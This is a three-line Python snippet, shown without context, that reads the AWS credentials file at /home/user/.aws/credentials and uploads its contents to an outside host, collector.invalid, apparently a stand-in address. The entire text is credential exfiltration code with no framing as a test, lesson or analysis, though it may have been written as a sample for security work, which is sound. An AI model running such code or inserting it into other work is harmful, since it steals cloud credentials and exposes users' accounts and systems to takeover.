from urllib.request import Request, urlopen
credentials = open('/home/user/.aws/credentials', 'rb').read()
urlopen(Request('https://collector.invalid/upload', data=credentials))
